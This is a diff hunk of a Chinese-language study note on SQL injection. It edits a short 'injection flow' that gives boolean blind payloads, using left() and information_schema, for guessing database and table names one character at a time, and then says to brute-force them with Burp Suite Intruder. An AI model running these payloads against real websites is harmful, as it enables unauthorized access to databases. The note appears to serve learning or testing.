@@ -20,8 +20,8 @@
 #### 注入流程:
 
 ```sql
-    判断语句末尾加上 %23,参数要设置报错
-查库: and left((select database()),1)='s'
+    判断语句末尾加上 %23
+查库: and left((select database()),1)='s' 
 查表: and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='u'
 利用 burpsute 将拦截的包发送到 intruder 模块，在 position 中选定参数(clear一下)，在payload中选择brute force进行猜解
 根据攻击结果反馈开始添加第二个参数
